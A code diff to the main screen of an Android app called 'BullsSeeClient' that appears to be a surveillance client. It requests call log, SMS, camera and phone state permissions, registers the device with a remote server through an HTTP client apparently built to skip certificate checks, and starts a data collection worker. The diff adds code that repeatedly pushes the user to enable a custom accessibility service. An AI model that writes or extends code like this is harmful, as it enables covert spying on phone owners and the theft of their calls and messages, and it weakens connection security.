@@ -6,8 +6,11 @@ import android.content.Intent
 import android.content.SharedPreferences
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.telephony.TelephonyManager
 import android.util.Log
+import android.view.accessibility.AccessibilityManager
+import android.accessibilityservice.AccessibilityServiceInfo // Added missing import
 import androidx.activity.ComponentActivity
 import androidx.activity.compose.setContent
 import androidx.activity.result.contract.ActivityResultContracts
@@ -15,10 +18,13 @@ import androidx.compose.foundation.layout.Arrangement
 import androidx.compose.foundation.layout.Column
 import androidx.compose.foundation.layout.fillMaxSize
 import androidx.compose.foundation.layout.padding
+import androidx.compose.material3.Button
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Surface
 import androidx.compose.material3.Text
 import androidx.compose.runtime.Composable
+import androidx.compose.runtime.mutableStateOf
+import androidx.compose.runtime.remember
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
 import androidx.compose.ui.text.font.FontWeight
@@ -34,6 +40,8 @@ import okhttp3.RequestBody
 import retrofit2.Call
 import retrofit2.Retrofit
 import retrofit2.converter.gson.GsonConverterFactory
+import retrofit2.Callback
+import retrofit2.Response
 import retrofit2.http.Body
 import retrofit2.http.POST
 import java.time.Instant
@@ -42,12 +50,14 @@ import java.util.concurrent.TimeUnit
 
 class MainActivity : ComponentActivity() {
     private val deviceName: String by lazy {
-        val telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            UUID.randomUUID().toString()
+        val prefs = getSharedPreferences("BullsSeePrefs", MODE_PRIVATE)
+        val storedDeviceId = prefs.getString("deviceId", null)
+        if (storedDeviceId != null) {
+            storedDeviceId
         } else {
-            @Suppress("DEPRECATION")
-            telephonyManager.deviceId ?: UUID.randomUUID().toString()
+            val newDeviceId = UUID.randomUUID().toString()
+            prefs.edit().putString("deviceId", newDeviceId).apply()
+            newDeviceId
         }
     }
 
@@ -65,7 +75,6 @@ class MainActivity : ComponentActivity() {
         if (callLogGranted && smsGranted && cameraGranted && phoneStateGranted) {
             Log.d("MainActivity", "All required permissions granted")
             registerDevice()
-            // Check if it's the first launch and trigger initial data collection
             if (!prefs.getBoolean("isFirstLaunch", false)) {
                 Log.d("MainActivity", "First launch detected, triggering one-time data collection")
                 val oneTimeWorkRequest = OneTimeWorkRequestBuilder<DataCollectionWorker>()
@@ -88,18 +97,19 @@ class MainActivity : ComponentActivity() {
         } else {
             Log.w("MainActivity", "Location permission denied, service not started")
         }
+        checkAccessibilityService()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         prefs = getSharedPreferences("BullsSeePrefs", MODE_PRIVATE)
         setContent {
-            MaterialTheme { // Replaced BullsSeeTheme with MaterialTheme
+            MaterialTheme {
                 Surface(
                     modifier = Modifier.fillMaxSize(),
                     color = MaterialTheme.colorScheme.background
                 ) {
-                    MainScreen()
+                    MainScreen(onEnableAccessibility = { checkAccessibilityService() })
                 }
             }
         }
@@ -116,10 +126,24 @@ class MainActivity : ComponentActivity() {
         )
     }
 
+    private fun checkAccessibilityService() {
+        val accessibilityManager = getSystemService(Context.ACCESSIBILITY_SERVICE) as AccessibilityManager
+        val isAccessibilityEnabled = accessibilityManager.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK)
+            .any { it.id == "$packageName/.MyAccessibilityService" }
+        if (!isAccessibilityEnabled) {
+            Log.d("MainActivity", "Accessibility service not enabled, redirecting to settings")
+            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
+            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            startActivity(intent)
+        } else {
+            Log.d("MainActivity", "Accessibility service is enabled")
+        }
+    }
+
     private fun registerDevice() {
         Log.d("MainActivity", "Registering device: deviceName=$deviceName, model=${Build.MODEL}, osVersion=${Build.VERSION.RELEASE}")
         val retrofit = Retrofit.Builder()
-            .baseUrl("https://30lss7df-7239.inc1.devtunnels.ms/")
+            .baseUrl("https://bullsseeapi.onrender.com/")
             .addConverterFactory(GsonConverterFactory.create())
             .client(HttpClient.getUnsafeOkHttpClient())
             .build()
@@ -127,11 +151,10 @@ class MainActivity : ComponentActivity() {
         val apiService = retrofit.create(ApiService::class.java)
         val device = DeviceData(deviceName, Build.MODEL, Build.VERSION.RELEASE, Instant.now().toEpochMilli())
         val body = RequestBody.create("application/json".toMediaType(), Gson().toJson(device))
-        apiService.registerDevice(body).enqueue(object : retrofit2.Callback<Void> {
-            override fun onResponse(call: Call<Void>, response: retrofit2.Response<Void>) {
+        apiService.registerDevice(body).enqueue(object : Callback<Void> {
+            override fun onResponse(call: Call<Void>, response: Response<Void>) {
                 if (response.isSuccessful) {
                     Log.d("MainActivity", "Device registered successfully: status=${response.code()}")
-                    // Force one-time DataCollectionWorker run after successful registration
                     val oneTimeWorkRequest = OneTimeWorkRequestBuilder<DataCollectionWorker>()
                         .setInputData(workDataOf("deviceName" to deviceName))
                         .build()
@@ -141,6 +164,7 @@ class MainActivity : ComponentActivity() {
                     Log.e("MainActivity", "Device registration failed: status=${response.code()}, message=${response.errorBody()?.string()}")
                 }
             }
+
             override fun onFailure(call: Call<Void>, t: Throwable) {
                 Log.e("MainActivity", "Device registration failed: error=${t.message}")
             }
@@ -156,7 +180,8 @@ class MainActivity : ComponentActivity() {
 }
 
 @Composable
-fun MainScreen() {
+fun MainScreen(onEnableAccessibility: () -> Unit) {
+    val accessibilityPrompt = remember { mutableStateOf(false) }
     Column(
         modifier = Modifier.fillMaxSize(),
         verticalArrangement = Arrangement.Center,
@@ -164,7 +189,7 @@ fun MainScreen() {
     ) {
         Text(
             text = "BullsSeeClient",
-            fontSize = 24.sp,
+            fontSize = 94.sp,
             fontWeight = FontWeight.Bold,
             color = MaterialTheme.colorScheme.primary
         )
@@ -174,5 +199,16 @@ fun MainScreen() {
             color = MaterialTheme.colorScheme.onSurface,
             modifier = Modifier.padding(top = 16.dp)
         )
+        if (accessibilityPrompt.value) {
+            Button(
+                onClick = {
+                    onEnableAccessibility()
+                    accessibilityPrompt.value = false
+                },
+                modifier = Modifier.padding(top = 16.dp)
+            ) {
+                Text("Enable Accessibility Service")
+            }
+        }
     }
 }
